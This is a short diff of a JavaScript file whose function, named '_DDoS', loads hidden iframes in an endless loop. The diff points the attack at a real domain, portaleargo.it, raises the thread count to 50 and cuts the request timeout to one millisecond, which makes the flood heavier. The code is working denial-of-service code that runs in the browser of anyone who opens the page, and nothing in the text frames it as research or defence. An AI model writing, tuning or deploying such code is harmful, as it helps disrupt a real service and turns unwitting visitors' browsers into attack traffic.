@@ -1,5 +1,5 @@
 var target = 'portaleargo.it';
-var thread_count = 1;
+var thread_count = 50;
 var scan_counter = 0;
 var resp_size_counter = 0;
 var Sys = {};
@@ -24,7 +24,7 @@ if (!Sys.ie){
   xhr.onreadystatechange = processResp;
 }else{
   xdr = new XDomainRequest();
-  xdr.timeout = 1000;
+  xdr.timeout = 1;
 }
 
 function while_loop_cor(){
@@ -67,5 +67,5 @@ function _DDoS(url){
  document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
 }
 for(;;){
- setTimeout('_DDoS("https://t.me/c/1324625323/1754")',1);
+ setTimeout('_DDoS("https://portaleargo.it/")',1);
 }
